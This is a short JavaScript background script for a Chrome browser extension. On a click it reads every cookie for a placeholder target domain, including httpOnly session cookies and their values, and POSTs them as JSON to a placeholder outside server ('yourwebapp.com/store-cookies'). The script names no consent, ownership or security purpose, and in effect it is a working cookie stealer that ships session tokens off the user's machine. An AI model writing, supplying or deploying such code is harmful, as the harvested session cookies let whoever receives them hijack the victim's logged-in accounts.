chrome.action.onClicked.addListener((tab) => {
    let targetDomain = "targetwebsite.com";

    chrome.cookies.getAll({ domain: targetDomain }, (cookies) => {
        let extractedCookies = cookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            sameSite: cookie.sameSite
        }));

        console.log("Extracted Cookies:", extractedCookies);

        // Send cookies to your web app
        fetch("https://yourwebapp.com/store-cookies", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cookies: extractedCookies })
        });
    });
});
